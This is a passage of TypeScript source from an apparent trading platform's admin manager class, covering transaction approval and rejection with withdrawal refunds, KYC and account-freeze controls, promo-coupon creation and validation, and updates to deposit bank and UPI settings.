      `APPROVED_${tx.type}`,
      tx.id,
      user?.name || tx.userName,
      `Amount: ${tx.currency} ${tx.amount} via ${tx.method}`
    );

    this.emit('transaction_updated', tx);
    this.persistTransaction(tx);
    return { success: true, transaction: { ...tx } };
  }

  public rejectTransaction(
    txId: string,
    reason: string,
    actor?: { id: string; name: string; role: UserRole }
  ): { success: boolean; transaction?: Transaction; error?: string } {
    const tx = this.transactions.find((t) => t.id === txId);
    if (!tx) return { success: false, error: 'Transaction not found' };
    if (tx.status !== 'PENDING') return { success: false, error: 'Transaction already resolved' };

    tx.status = 'REJECTED';
    tx.rejectReason = reason || 'Declined by Admin compliance';

    const USD_INR_RATE = 95.0;
    // If it was a withdrawal that failed/rejected, refund the user
    const user = this.users.get(tx.userId);
    if (user && tx.type === 'WITHDRAWAL') {
      let refundAmount = tx.amount;
      if (user.currency === 'INR' && tx.currency === 'USD') {
        refundAmount = Number((tx.amount * USD_INR_RATE).toFixed(2));
      } else if (user.currency === 'USD' && tx.currency === 'INR') {
        refundAmount = Number((tx.amount / USD_INR_RATE).toFixed(2));
      }
      user.realBalance = Number((user.realBalance + refundAmount).toFixed(2));
      user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
      this.emit('user_updated', user);
      this.persistUser(user);
    }

    this.addAuditLog(
      actor?.id || 'admin_sys',
      actor?.name || 'Operations Desk',
      actor?.role || 'MANAGER',
      `REJECTED_${tx.type}`,
      tx.id,
      user?.name || tx.userName,
      `Reason: ${tx.rejectReason}`
    );

    this.emit('transaction_updated', tx);
    this.persistTransaction(tx);
    return { success: true, transaction: { ...tx } };
  }

  public setUserKyc(
    userId: string,
    isVerified: boolean,
    actor?: { id: string; name: string; role: UserRole }
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };
    user.isKycVerified = isVerified;
    user.kycStatus = isVerified ? 'APPROVED' : 'NOT_SUBMITTED';
    if (!isVerified) {
      user.kycData = undefined;
      user.aadhaarNumber = undefined;
    }
    this.addAuditLog(
      actor?.id || 'mgr_sys',
      actor?.name || 'Operations Desk',
      actor?.role || 'MANAGER',
      isVerified ? 'VERIFIED_KYC' : 'REVOKED_KYC',
      user.id,
      user.name,
      `KYC status changed to ${isVerified ? 'VERIFIED' : 'REVOKED'}`
    );
    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public setUserStatus(
    userId: string,
    status: 'ACTIVE' | 'FROZEN',
    actor?: { id: string; name: string; role: UserRole }
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };
    user.status = status;
    this.addAuditLog(
      actor?.id || 'mgr_sys',
      actor?.name || 'Operations Desk',
      actor?.role || 'MANAGER',
      status === 'FROZEN' ? 'FROZE_USER' : 'UNFROZE_USER',
      user.id,
      user.name,
      `User account status set to ${status}`
    );
    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public resetUserDemo(
    userId: string,
    actor?: { id: string; name: string; role: UserRole }
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };
    user.demoBalance = 700000.00;
    this.addAuditLog(
      actor?.id || 'mgr_sys',
      actor?.name || 'Operations Desk',
      actor?.role || 'MANAGER',
      'RESET_DEMO_BALANCE',
      user.id,
      user.name,
      'Demo balance reset to ₹7,00,000.00'
    );
    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public getManagerOverview(): {
    pendingDeposits: number;
    pendingWithdrawals: number;
    totalActiveUsers: number;
    verifiedUsersCount: number;
    totalApprovedDepositsUSD: number;
    totalPendingAmountUSD: number;
  } {
    let pendingDeposits = 0;
    let pendingWithdrawals = 0;
    let totalApprovedDepositsUSD = 0;
    let totalPendingAmountUSD = 0;

    for (const tx of this.transactions) {
      if (tx.userId === 'usr_quotex_vip_99') continue; // Alex Rivera test account excluded

      const amtUSD = tx.currency === 'INR' ? (tx.amount / 95) : tx.amount;

      if (tx.status === 'PENDING') {
        if (tx.type === 'DEPOSIT') pendingDeposits++;
        if (tx.type === 'WITHDRAWAL') pendingWithdrawals++;
        totalPendingAmountUSD += amtUSD;
      }
      if (tx.status === 'APPROVED' && tx.type === 'DEPOSIT') {
        totalApprovedDepositsUSD += amtUSD;
      }
    }

    const realTraders = Array.from(this.users.values()).filter(
      (u) => u.role === 'TRADER' && u.id !== 'usr_quotex_vip_99'
    );
    const totalActiveUsers = realTraders.filter((u) => u.status === 'ACTIVE').length;
    const verifiedUsersCount = realTraders.filter((u) => u.isKycVerified).length;

    return {
      pendingDeposits,
      pendingWithdrawals,
      totalActiveUsers,
      verifiedUsersCount,
      totalApprovedDepositsUSD: Number(totalApprovedDepositsUSD.toFixed(2)),
      totalPendingAmountUSD: Number(totalPendingAmountUSD.toFixed(2)),
    };
  }

  public getCoupons(): PromoCoupon[] {
    return [...this.coupons];
  }

  public createCoupon(params: {
    code: string;
    bonusPercentage: number;
    maxBonusUSD?: number;
    minDepositUSD?: number;
    maxBonusINR?: number;
    minDepositINR?: number;
    currency?: 'INR' | 'USD';
    maxUsage: number;
  }): { success: boolean; coupon?: PromoCoupon; error?: string } {
    const upperCode = params.code.trim().toUpperCase();
    if (!upperCode) return { success: false, error: 'Coupon code cannot be empty' };
    if (this.coupons.some((c) => c.code === upperCode)) {
      return { success: false, error: 'Coupon code already exists' };
    }

    const rate = 95.0;
    let minUSD = params.minDepositUSD || 0;
    let maxBonusUSD = params.maxBonusUSD || 0;
    let minINR = params.minDepositINR || 0;
    let maxBonusINR = params.maxBonusINR || 0;

    if (params.currency === 'INR' || (!params.minDepositUSD && params.minDepositINR)) {
      minINR = params.minDepositINR || 0;
      maxBonusINR = params.maxBonusINR || 0;
      minUSD = Number((minINR / rate).toFixed(2));
      maxBonusUSD = Number((maxBonusINR / rate).toFixed(2));
    } else {
      minUSD = params.minDepositUSD || 0;
      maxBonusUSD = params.maxBonusUSD || 0;
      if (!minINR) minINR = Math.round(minUSD * rate);
      if (!maxBonusINR) maxBonusINR = Math.round(maxBonusUSD * rate);
    }

    const newCoupon: PromoCoupon = {
      id: `cpn_${uuidv4().slice(0, 8)}`,
      code: upperCode,
      bonusPercentage: params.bonusPercentage,
      maxBonusUSD,
      minDepositUSD: minUSD,
      maxBonusINR,
      minDepositINR: minINR,
      usageCount: 0,
      maxUsage: params.maxUsage || 500,
      isActive: true,
      createdAt: Date.now(),
    };

    this.coupons.unshift(newCoupon);
    this.emit('coupon_created', newCoupon);
    SupabaseDb.saveCoupon(newCoupon);
    return { success: true, coupon: newCoupon };
  }

  public toggleCoupon(id: string): { success: boolean; coupon?: PromoCoupon } {
    const coupon = this.coupons.find((c) => c.id === id);
    if (!coupon) return { success: false };
    coupon.isActive = !coupon.isActive;
    SupabaseDb.saveCoupon(coupon);
    return { success: true, coupon: { ...coupon } };
  }

  public deleteCoupon(id: string): boolean {
    const coupon = this.coupons.find((c) => c.id === id);
    const initial = this.coupons.length;
    this.coupons = this.coupons.filter((c) => c.id !== id);
    if (coupon) SupabaseDb.deleteCoupon(coupon.code);
    return this.coupons.length < initial;
  }

  public validateCoupon(
    code: string,
    depositAmount: number,
    currency: 'INR' | 'USD' = 'INR'
  ): { valid: boolean; bonus: number; bonusPercentage: number; message: string; coupon?: PromoCoupon } {
    const coupon = this.coupons.find((c) => c.code === code.trim().toUpperCase() && c.isActive);
    if (!coupon) return { valid: false, bonus: 0, bonusPercentage: 0, message: 'Invalid or expired promo code' };

    const rate = 95.0;
    const isINR = currency === 'INR';
    const minRequired = isINR ? (coupon.minDepositINR || coupon.minDepositUSD * rate) : coupon.minDepositUSD;
    const maxBonusCap = isINR ? (coupon.maxBonusINR || coupon.maxBonusUSD * rate) : coupon.maxBonusUSD;

    if (depositAmount < minRequired) {
      return {
        valid: false,
        bonus: 0,
        bonusPercentage: coupon.bonusPercentage,
        message: `Min deposit for ${coupon.code} is ${isINR ? '₹' + minRequired.toLocaleString() : '$' + minRequired}`,
      };
    }

    if (coupon.usageCount >= coupon.maxUsage) {
      return { valid: false, bonus: 0, bonusPercentage: coupon.bonusPercentage, message: 'Coupon usage limit reached' };
    }

    const rawBonus = depositAmount * (coupon.bonusPercentage / 100);
    const calculatedBonus = Math.min(maxBonusCap, rawBonus);

    return {
      valid: true,
      bonus: Number(calculatedBonus.toFixed(2)),
      bonusPercentage: coupon.bonusPercentage,
      coupon,
      message: `+${coupon.bonusPercentage}% bonus (${isINR ? '₹' + calculatedBonus.toLocaleString() : '$' + calculatedBonus.toFixed(2)}) applied!`,
    };
  }

  public getPaymentSettings(): DepositPaymentSettings {
    return { ...this.paymentSettings };
  }

  public updatePaymentSettings(
    newSettings: Partial<DepositPaymentSettings>,
    actor?: { id: string; name: string; role: UserRole }
  ): DepositPaymentSettings {
    this.paymentSettings = {
      ...this.paymentSettings,
      ...newSettings,
      updatedAt: Date.now(),
      updatedBy: actor ? `${actor.name} (${actor.role})` : 'System Administrator',
    };

    if (actor) {
      this.auditLogs.unshift({
        id: `aud_${uuidv4().slice(0, 8)}`,
        actorId: actor.id,
        actorName: actor.name,
        actorRole: actor.role,
        action: 'UPDATE_PAYMENT_SETTINGS',
        details: `Updated Bank: ${this.paymentSettings.bankName} | A/C: ${this.paymentSettings.accountNumber} | IFSC: ${this.paymentSettings.ifscCode} | UPI: ${this.paymentSettings.upiId}`,
        timestamp: Date.now(),
      });
    }

    this.emit('payment_settings_updated', this.paymentSettings);
    return { ...this.paymentSettings };
  }
}

